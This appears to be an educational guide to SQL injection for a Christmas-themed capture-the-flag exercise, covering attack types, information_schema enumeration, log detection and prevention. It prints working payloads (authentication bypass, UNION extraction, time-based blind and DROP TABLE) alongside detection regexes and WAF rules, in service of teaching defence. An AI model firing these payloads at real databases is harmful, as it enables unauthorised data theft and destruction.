# SQL Injection - What, Why, and How

A comprehensive guide to understanding and identifying SQL injection attacks.

---

## 📋 Table of Contents

1. [What is SQL?](#what-is-sql)
2. [How Databases Work](#how-databases-work)
3. [How Web Applications Use SQL](#how-web-applications-use-sql)
4. [What is SQL Injection?](#what-is-sql-injection)
5. [Why SQL Injection Works](#why-sql-injection-works)
6. [Types of SQL Injection](#types-of-sql-injection)
7. [Information Schema Enumeration](#information-schema-enumeration)
8. [Identifying SQL Injection in Logs](#identifying-sql-injection-in-logs)
9. [Real-World Examples](#real-world-examples)
10. [Prevention Methods](#prevention-methods)
11. [Tools for Analysis](#tools-for-analysis)

---

## What is SQL?

**SQL (Structured Query Language)** is the language used to interact with databases.

### Basic SQL Concepts

**A database is like a digital filing cabinet:**
- **Database** = The entire filing cabinet
- **Table** = A drawer in the cabinet (e.g., "nice_list", "elves", "gifts")
- **Row** = A single record/file (e.g., one child's information)
- **Column** = A field in the record (e.g., "child_name", "address", "behavioral_score")

**Example: Nice List Database**

```
Table: nice_list
┌────────────┬──────────────────┬─────────────────────┬──────────────────┬─────────────────────┐
│ child_id   │ child_name       │ address             │ behavioral_score │ gift_preference     │
├────────────┼──────────────────┼─────────────────────┼──────────────────┼─────────────────────┤
│ 1          │ Emily Thompson   │ 123 Maple St, NYC   │ 92               │ Robot toy           │
│ 2          │ Michael Chen     │ 456 Oak Ave, LA     │ 88               │ Art supplies        │
│ 3          │ Sarah Johnson    │ 789 Pine Rd, Chicago│ 95               │ Science kit         │
└────────────┴──────────────────┴─────────────────────┴──────────────────┴─────────────────────┘
```

### Common SQL Commands

**SELECT - Retrieve data:**
```sql
SELECT child_name, city FROM nice_list WHERE behavioral_score > 80
-- Returns names and cities of well-behaved children
```

**INSERT - Add new data:**
```sql
INSERT INTO nice_list (child_name, address, behavioral_score)
VALUES ('Jessica Smith', '321 Elm St, Boston', 90)
```

**UPDATE - Modify existing data:**
```sql
UPDATE nice_list SET gift_preference = 'Bicycle' WHERE child_id = 5
```

**DELETE - Remove data:**
```sql
DELETE FROM nice_list WHERE child_id = 10
```

### SQL Syntax Components

**WHERE clause - Filters results:**
```sql
SELECT * FROM nice_list WHERE child_id = 123
-- Returns only the child with ID 123
```

**Comments - Notes in SQL code:**
```sql
-- This is a single-line comment
/* This is a
   multi-line comment */
SELECT * FROM nice_list;  # This is also a comment (MySQL)
```

**String literals - Text values:**
```sql
SELECT * FROM nice_list WHERE child_name = 'Emily'
-- Strings must be in single quotes!
```

---

## How Databases Work

### Client-Server Architecture

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│  Web Browser    │────────▶│  Web Application │────────▶│    Database     │
│  (User)         │         │  (PHP/Python/    │         │    (MySQL/      │
│                 │◀────────│   Node.js/etc.)  │◀────────│    PostgreSQL)  │
└─────────────────┘         └──────────────────┘         └─────────────────┘
     1. User          2. App builds         3. Database        4. Results
     requests         SQL query and         executes query      returned
     data             sends to database     and returns data    to user
```

### How a Normal Query Works

**Step 1: User submits form**
```
User enters: child_id = 123
```

**Step 2: Application builds SQL query**
```python
# Python example (VULNERABLE CODE - DO NOT USE!)
child_id = request.GET['child_id']  # User input: "123"
query = "SELECT * FROM nice_list WHERE child_id = " + child_id
# Result: SELECT * FROM nice_list WHERE child_id = 123
```

**Step 3: Database executes query**
```sql
SELECT * FROM nice_list WHERE child_id = 123
```

**Step 4: Results returned**
```
child_name: Emily Thompson
address: 123 Maple St, NYC
behavioral_score: 92
```

### This Works Fine... Until Someone Exploits It

---

## How Web Applications Use SQL

### The Vulnerable Pattern

Many web applications take user input and insert it directly into SQL queries:

**Example: Nice List Lookup API**

```
URL: https://northpole.com/api/nice-list/lookup?child_id=123
```

**Backend code (VULNERABLE!):**
```python
# Flask/Python example
@app.route('/api/nice-list/lookup')
def lookup_child():
    child_id = request.args.get('child_id')  # User-provided!

    # Build SQL query by concatenating strings (DANGEROUS!)
    query = f"SELECT * FROM nice_list WHERE child_id = {child_id}"

    result = database.execute(query)
    return jsonify(result)
```

**What the developer assumed:**
- Users will only enter numbers: `123`, `456`, etc.
- The query will always look like: `SELECT * FROM nice_list WHERE child_id = 123`

**What actually happens:**
- **Attackers can enter ANYTHING**: `123' OR '1'='1`, `123; DROP TABLE nice_list`, etc.
- The query becomes: `SELECT * FROM nice_list WHERE child_id = 123' OR '1'='1`
- **The database executes whatever the attacker sends!**

---

## What is SQL Injection?

**SQL Injection (SQLi)** is a technique where an attacker injects malicious SQL code into an application's database query.

### The Core Concept

Instead of providing expected input (like a number), the attacker provides **SQL code** that modifies the query's behavior.

**Example 1: Authentication Bypass**

**Normal login query:**
```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
-- Returns Alice's record if password matches
```

**What the attacker enters:**
```
Username: admin' OR '1'='1
Password: anything
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

**Why this works:**
- `OR '1'='1'` is ALWAYS TRUE
- The query returns ALL users (including admin!)
- Application thinks the login succeeded!

**Example 2: Data Exfiltration**

**Normal query:**
```sql
SELECT gift_preference FROM nice_list WHERE child_id = 123
-- Returns: "Robot toy"
```

**What the attacker enters:**
```
child_id = 123' UNION SELECT password FROM users--
```

**Resulting query:**
```sql
SELECT gift_preference FROM nice_list WHERE child_id = 123' UNION SELECT password FROM users--
```

**Why this works:**
- The `'` closes the original string
- `UNION SELECT` adds a second query
- `--` comments out the rest of the original query
- Returns gift preferences AND all passwords!

---

## Why SQL Injection Works

### Three Key Reasons

**1. Lack of Input Validation**

The application doesn't check if the input is valid:

```python
# Vulnerable - accepts ANY input
child_id = request.GET['child_id']  # Could be "123", "abc", "'; DROP TABLE--", etc.
```

```python
# Secure - validates input
child_id = request.GET['child_id']
if not child_id.isdigit():
    return "Error: child_id must be a number"
```

**2. String Concatenation**

Building SQL queries by gluing strings together:

```python
# Vulnerable - string concatenation
query = "SELECT * FROM nice_list WHERE child_id = " + child_id
```

```python
# Secure - parameterized query
query = "SELECT * FROM nice_list WHERE child_id = ?"
database.execute(query, (child_id,))  # Database safely handles the parameter
```

**3. Database Executes Literally**

The database doesn't know which parts of the query came from the developer vs. the attacker:

```sql
-- The database sees this:
SELECT * FROM nice_list WHERE child_id = 123' OR '1'='1

-- And executes it exactly as written!
-- It doesn't know the ' OR '1'='1 part came from an attacker
```

---

## Types of SQL Injection

### 1. UNION-Based SQL Injection

**Most common and powerful method.** Combines results from multiple queries.

**How it works:**
```sql
-- Original query:
SELECT gift_preference FROM nice_list WHERE child_id = 123

-- Injected payload:
123' UNION SELECT table_name FROM information_schema.tables--

-- Final query:
SELECT gift_preference FROM nice_list WHERE child_id = 123' UNION SELECT table_name FROM information_schema.tables--

-- Returns:
-- "Robot toy" (original result)
-- "nice_list" (table name from UNION)
-- "elves" (table name from UNION)
-- "gifts" (table name from UNION)
```

**Requirements:**
- Number of columns must match between queries
- Data types should be compatible

**Example attack progression:**

**Step 1: Find number of columns**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--  (Works! 3 columns)
```

**Step 2: Determine column types**
```sql
' UNION SELECT 'a', 'b', 'c'--  (All strings)
```

**Step 3: Extract data**
```sql
' UNION SELECT child_name, address, behavioral_score FROM nice_list--
```

### 2. Boolean-Based Blind SQL Injection

**Used when the application doesn't show query results, only TRUE/FALSE responses.**

**Example:**
```sql
-- Test if database is MySQL:
' AND (SELECT LENGTH(DATABASE())) > 0--
-- If page loads normally = TRUE = MySQL database

-- Extract database name character by character:
' AND SUBSTRING(DATABASE(), 1, 1) = 'n'--  (TRUE - first letter is 'n')
' AND SUBSTRING(DATABASE(), 2, 1) = 'i'--  (TRUE - second letter is 'i')
' AND SUBSTRING(DATABASE(), 3, 1) = 'c'--  (TRUE - third letter is 'c')
-- Database name: "nice_list_db"
```

**Characteristics:**
- Very slow (one bit of information per request)
- Works when no error messages or data is returned
- Relies on observing different responses (page loads vs. error)

### 3. Time-Based Blind SQL Injection

**Used when there's no visible difference in responses.**

**Example:**
```sql
-- Test if query is vulnerable:
' AND SLEEP(5)--
-- If page takes 5+ seconds to load = VULNERABLE!

-- Extract data bit by bit:
' AND IF(SUBSTRING(DATABASE(), 1, 1) = 'n', SLEEP(5), 0)--
-- If delay = TRUE, first letter is 'n'
```

**Characteristics:**
- Extremely slow (requires waiting for delays)
- Works even when application shows identical responses
- Common in login forms, search boxes

### 4. Error-Based SQL Injection

**Uses database error messages to extract data.**

**Example:**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--
```

**Error message reveals:**
```
Duplicate entry 'nice_list_db:1' for key 'group_key'
                 ^^^^^^^^^^^^
                 Database name!
```

**Characteristics:**
- Fast extraction if errors are displayed
- Requires verbose error messages (often disabled in production)
- Database-specific syntax

### 5. Stacked Queries / Second-Order Injection

**Execute multiple SQL statements in one injection:**

```sql
'; DROP TABLE nice_list; --

-- Becomes:
SELECT * FROM nice_list WHERE child_id = ''; DROP TABLE nice_list; --'
-- First query: Returns nothing
-- Second query: DELETES THE ENTIRE TABLE!
```

**Note:** Many modern databases/frameworks prevent this by default.

---

## Information Schema Enumeration

### What is information_schema?

`information_schema` is a **built-in meta-database** in MySQL, PostgreSQL, and SQL Server that stores information about all databases, tables, and columns.

**Think of it as the database's table of contents.**

### Key Tables in information_schema

**1. information_schema.SCHEMATA - Lists all databases**
```sql
SELECT schema_name FROM information_schema.schemata
-- Returns: mysql, information_schema, nice_list_db, performance_schema
```

**2. information_schema.TABLES - Lists all tables**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'nice_list_db'
-- Returns: nice_list, elves, gifts, delivery_routes
```

**3. information_schema.COLUMNS - Lists all columns**
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'nice_list'
-- Returns: child_id, child_name, address, behavioral_score, gift_preference
```

### Attack Progression Using information_schema

**Phase 1: Discover current database**
```sql
' UNION SELECT database()--
-- Returns: nice_list_db
```

**Phase 2: Enumerate all tables**
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'nice_list_db'--
-- Returns:
-- nice_list
-- elves
-- gifts
-- delivery_routes
-- admin_users
```

**Phase 3: Enumerate columns in target table**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'nice_list'--
-- Returns:
-- child_id
-- child_name
-- address
-- behavioral_score
-- gift_preference
```

**Phase 4: Extract all data**
```sql
' UNION SELECT CONCAT(child_name, ':', address, ':', behavioral_score) FROM nice_list--
-- Returns:
-- Emily Thompson:123 Maple St, NYC:92
-- Michael Chen:456 Oak Ave, LA:88
-- Sarah Johnson:789 Pine Rd, Chicago:95
-- (2.7 million more rows...)
```

### Why This is Devastating

Without `information_schema`, an attacker would need to **guess** table and column names:

```sql
' UNION SELECT password FROM users--  (Guess: table might be called "users")
' UNION SELECT pass FROM accounts--   (Guess: column might be "pass")
```

**With `information_schema`, attackers can systematically map the ENTIRE database** without guessing!

---

## Identifying SQL Injection in Logs

### Normal vs. Malicious Queries

**Normal queries:**
```sql
SELECT * FROM nice_list WHERE child_id = 123
SELECT gift_preference FROM nice_list WHERE behavioral_score > 80
UPDATE nice_list SET letter_received = TRUE WHERE child_id = 5521
```

**SQL injection queries:**
```sql
SELECT * FROM nice_list WHERE child_id = 1' OR '1'='1
SELECT * FROM nice_list WHERE child_id = 1' UNION SELECT table_name FROM information_schema.tables--
SELECT * FROM nice_list WHERE child_id = 1'; DROP TABLE nice_list--
```

### Telltale Signs of SQL Injection

**1. Special characters in unexpected places:**
- Single quotes: `'`
- Comment syntax: `--`, `#`, `/* */`
- Semicolons: `;` (separating statements)
- SQL keywords in user input: `UNION`, `SELECT`, `OR`, `AND`

**2. SQL keywords in WHERE clauses:**
```sql
-- Normal:
WHERE child_id = 123

-- Suspicious:
WHERE child_id = 123' UNION SELECT
WHERE child_id = 123' OR '1'='1
WHERE child_id = 123; DROP TABLE
```

**3. information_schema queries:**
```sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns
```

**4. Always-true conditions:**
```sql
OR '1'='1
OR 1=1
OR 'a'='a
```

**5. Comment characters at the end:**
```sql
WHERE child_id = '123'--
-- The -- comments out the closing quote!
```

### Log Analysis Techniques

**Search for SQL injection patterns:**

**PowerShell:**
```powershell
# Find UNION SELECT queries
Get-Content database.log | Select-String "UNION\s+SELECT"

# Find information_schema enumeration
Get-Content database.log | Select-String "information_schema"

# Find authentication bypass attempts
Get-Content database.log | Select-String "OR '1'='1|OR 1=1"

# Find SQL comments
Get-Content database.log | Select-String "--|\#|/\*"
```

**Bash:**
```bash
# Find UNION SELECT queries
grep -i "UNION SELECT" database.log

# Find information_schema enumeration
grep -i "information_schema" database.log

# Find authentication bypass attempts
grep -E "OR '1'='1|OR 1=1" database.log

# Find SQL comments
grep -E "\-\-|#|/\*" database.log
```

### Timeline Reconstruction

SQL injection attacks follow a predictable pattern:

```
Time: 03:47:12 - Test for vulnerability
  SELECT * FROM nice_list WHERE child_id = 1' OR '1'='1

Time: 03:47:45 - Enumerate database name
  ' UNION SELECT database()--

Time: 03:48:10 - Enumerate tables
  ' UNION SELECT table_name FROM information_schema.tables--

Time: 03:48:55 - Enumerate columns
  ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='nice_list'--

Time: 03:50:22 - Extract data
  ' UNION SELECT child_name, address, behavioral_score FROM nice_list--

Time: 03:51:00 - Exfiltrate (47,823 queries dumping all rows)
  (Repeated UNION SELECT queries with LIMIT/OFFSET to extract all data)
```

---

## Real-World Examples

### Case Study 1: Heartland Payment Systems (2008)

**Attack:**
- SQL injection in web application
- Installed malware on database servers
- Stole 134 million credit card numbers over several months

**Impact:**
- $140 million in damages
- Company nearly went bankrupt
- Led to PCI DSS compliance changes

**What happened:**
```sql
-- Vulnerable code:
$query = "SELECT * FROM transactions WHERE card_number = '$input'";

-- Attacker's payload:
'; INSERT INTO backup_table SELECT * FROM transactions--

-- Result: Copied all credit card data to attacker-controlled table
```

### Case Study 2: Sony PlayStation Network (2011)

**Attack:**
- SQL injection in web application
- Accessed user database
- 77 million accounts compromised

**Impact:**
- 23-day network outage
- $171 million in costs
- Massive reputation damage

**Vulnerable endpoint:**
```php
// Vulnerable PHP code
$query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
```

### Case Study 3: TalkTalk (2015)

**Attack:**
- Simple SQL injection via web form
- Teenager used basic ' OR 1=1-- payload
- Accessed 157,000 customer records

**Impact:**
- £77 million in costs
- £400,000 fine from regulators
- CEO resigned

**Quote from investigation:** *"The vulnerability was basic... any beginner with knowledge of SQL injection could have exploited it."*

### Case Study 4: Jack Frost's Attack (2024) 🎄

**Attack progression:**
```
Day 6: Web reconnaissance - found /api/v2/nice-list/lookup endpoint
Day 7: Tested DNS tunneling for exfiltration
Day 8: SQL injection to dump nice_list database
       - Enumerated tables via information_schema
       - Extracted 2.7 million records (47,823 UNION queries)
       - Exfiltrated data via DNS tunneling
```

**Vulnerable code:**
```python
@app.route('/api/v2/nice-list/lookup')
def lookup():
    child_id = request.args.get('child_id')
    query = f"SELECT * FROM nice_list WHERE child_id = {child_id}"  # VULNERABLE!
    return database.execute(query)
```

**Impact:**
- Entire Nice List database compromised
- Children's addresses exposed
- Christmas delivery routes at risk
- 6 days until Christmas Eve!

---

## Prevention Methods

### 1. Parameterized Queries (Prepared Statements)

**The #1 defense against SQL injection.**

**Vulnerable code:**
```python
# BAD - String concatenation
query = f"SELECT * FROM nice_list WHERE child_id = {child_id}"
database.execute(query)
```

**Secure code:**
```python
# GOOD - Parameterized query
query = "SELECT * FROM nice_list WHERE child_id = ?"
database.execute(query, (child_id,))  # Parameter safely passed separately
```

**Why this works:**
- SQL code and data are separated
- Database treats `?` as a VALUE, not CODE
- Even if user enters `' OR '1'='1`, it's treated as a literal string

**Example in different languages:**

**Python (sqlite3):**
```python
cursor.execute("SELECT * FROM nice_list WHERE child_id = ?", (child_id,))
```

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM nice_list WHERE child_id = :id");
$stmt->execute(['id' => $child_id]);
```

**Node.js (MySQL):**
```javascript
connection.query("SELECT * FROM nice_list WHERE child_id = ?", [child_id], callback);
```

### 2. Input Validation

**Whitelist allowed characters:**

```python
# Validate that child_id is a number
if not child_id.isdigit():
    return "Invalid input: child_id must be numeric"

# Validate that name contains only letters
if not re.match(r'^[a-zA-Z\s]+$', child_name):
    return "Invalid input: name must contain only letters"
```

**Length restrictions:**
```python
if len(child_id) > 10:
    return "Invalid input: child_id too long"
```

### 3. Least Privilege Database Accounts

**Give each application minimal permissions:**

```sql
-- DON'T: Application uses admin account
GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'localhost';

-- DO: Application has only SELECT/INSERT/UPDATE on specific tables
GRANT SELECT, INSERT, UPDATE ON nice_list_db.nice_list TO 'app_user'@'localhost';
-- No DROP, CREATE, DELETE, or access to information_schema!
```

**Why this helps:**
- Even if SQL injection succeeds, attacker can't drop tables
- Limits damage from successful exploits

### 4. Web Application Firewall (WAF)

**Deploy a WAF to detect and block SQL injection attempts:**

**Example WAF rules:**
```
# Block UNION SELECT
Block if request contains: UNION.*SELECT

# Block information_schema
Block if request contains: information_schema

# Block SQL comments
Block if request contains: --(space)|#|/\*

# Block common payloads
Block if request contains: OR '1'='1|OR 1=1
```

**Popular WAFs:**
- ModSecurity (open-source)
- AWS WAF
- Cloudflare WAF
- Imperva

### 5. Error Handling

**Don't reveal database errors to users:**

**Vulnerable:**
```python
try:
    database.execute(query)
except Exception as e:
    return str(e)  # Returns: "Unknown column 'password' in 'field list'"
```

**Secure:**
```python
try:
    database.execute(query)
except Exception as e:
    logger.error(f"Database error: {e}")
    return "An error occurred. Please try again later."  # Generic message
```

### 6. Regular Security Testing

**Test for SQL injection vulnerabilities:**

**Automated tools:**
- sqlmap (penetration testing tool)
- Burp Suite
- OWASP ZAP

**Manual testing:**
- Submit `'` in all input fields (should cause error if vulnerable)
- Try `' OR '1'='1--` in login forms
- Test `' UNION SELECT NULL--` in search boxes

### 7. Code Review & Secure Coding Training

**Review all database queries:**
```python
# Search codebase for dangerous patterns:
grep -r "SELECT.*\+" .   # String concatenation in SELECT
grep -r "execute.*%s" .  # String formatting in execute()
```

**Developer training:**
- Teach parameterized queries
- Explain SQL injection risks
- Provide secure coding examples

---

## Tools for Analysis

### 1. Text Editors with Regex Search

**Notepad++:**
- Search → Find → Enable "Regular expression"
- Search for: `UNION|information_schema|OR '1'='1`

**VSCode:**
- Ctrl+Shift+F (Find in Files)
- Enable regex mode
- Search: `UNION\s+SELECT|information_schema`

### 2. Command-Line Tools

**grep (Linux/Mac/WSL):**
```bash
grep -i "UNION SELECT" database.log
grep -E "OR '1'='1|OR 1=1" database.log
```

**PowerShell (Windows):**
```powershell
Select-String -Path database.log -Pattern "UNION SELECT"
Get-Content database.log | Where-Object { $_ -match "information_schema" }
```

### 3. CyberChef

**For decoding base64-encoded payloads:**
https://gchq.github.io/CyberChef/

**Recipe:**
1. Drag "From Base64" to Recipe
2. Paste base64 SQL injection payload
3. View decoded SQL query

### 4. Online SQL Formatters

**Make SQL queries readable:**
- https://sqlformat.org/
- https://www.dpriver.com/pp/sqlformat.htm

**Example:**
```sql
-- Ugly:
SELECT*FROM nice_list WHERE child_id=1'UNION SELECT table_name FROM information_schema.tables--

-- Formatted:
SELECT *
FROM nice_list
WHERE child_id = 1' UNION
SELECT table_name
FROM information_schema.tables--
```

### 5. Spreadsheet Software (Excel/Google Sheets)

**For analyzing large result sets:**
- Import CSV log data
- Filter for specific patterns
- Sort by timestamp
- Count occurrences

---

## Key Takeaways

✅ **SQL injection is the #1 web vulnerability** - Easy to exploit, devastating impact

✅ **Happens when user input is directly inserted into SQL queries** - String concatenation is the root cause

✅ **Attackers use information_schema to map databases** - Systematic enumeration without guessing

✅ **UNION SELECT is the most powerful technique** - Combines attacker's query with legitimate query

✅ **Parameterized queries prevent SQL injection** - Separate SQL code from data

✅ **Input validation is a secondary defense** - Whitelist allowed characters

✅ **Log analysis reveals attack patterns** - Look for UNION, information_schema, comments, always-true conditions

✅ **Real-world impact is massive** - Heartland ($140M), Sony (77M accounts), TalkTalk (£77M)

---

## Practice Scenarios

### Scenario 1: Identify the Vulnerability

**Code snippet:**
```python
username = request.POST['username']
password = request.POST['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

**Is this vulnerable?** YES! String concatenation with user input.

**Attack payload:**
```
Username: admin' OR '1'='1'--
Password: anything
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'
-- Returns all users! Authentication bypassed!
```

### Scenario 2: Reconstruct the Attack

**Log entries:**
```
[2024-12-19 03:47:12] SELECT * FROM products WHERE id = 1' OR '1'='1
[2024-12-19 03:47:45] SELECT * FROM products WHERE id = 1' UNION SELECT database()--
[2024-12-19 03:48:10] SELECT * FROM products WHERE id = 1' UNION SELECT table_name FROM information_schema.tables--
[2024-12-19 03:48:55] SELECT * FROM products WHERE id = 1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
[2024-12-19 03:50:22] SELECT * FROM products WHERE id = 1' UNION SELECT username, password FROM users--
```

**Attack timeline:**
1. ✅ Test vulnerability (OR '1'='1)
2. ✅ Get database name
3. ✅ Enumerate tables
4. ✅ Enumerate columns in 'users' table
5. ✅ Extract all usernames and passwords

---

## Additional Resources

**OWASP (Open Web Application Security Project):**
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

**PortSwigger SQL Injection Guide:**
- https://portswigger.net/web-security/sql-injection

**HackerOne Disclosed Reports:**
- https://hackerone.com/hacktivity?querystring=sql%20injection

**sqlmap (Automated Testing Tool):**
- https://sqlmap.org/

---

**You're now ready to analyze SQL injection attacks in database logs!** 🎄

Remember:
- Look for UNION, information_schema, and SQL comments
- Reconstruct the attack timeline
- Understand what data was exfiltrated
- Think like an attacker to defend like a pro!

*Good luck analyzing Jack Frost's database heist!* ❄️
